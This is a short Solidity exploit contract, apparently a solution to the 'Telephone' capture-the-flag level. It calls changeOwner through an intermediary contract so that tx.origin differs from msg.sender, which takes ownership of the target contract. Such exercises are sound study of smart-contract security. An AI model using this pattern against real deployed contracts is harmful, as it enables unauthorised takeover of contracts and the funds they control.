// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import { Telephone } from "../../src/Telephone/Telephone.sol";

contract TelephoneHack {
    Telephone telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function pwn(address newOwner) public {
        telephone.changeOwner(newOwner);
    }
}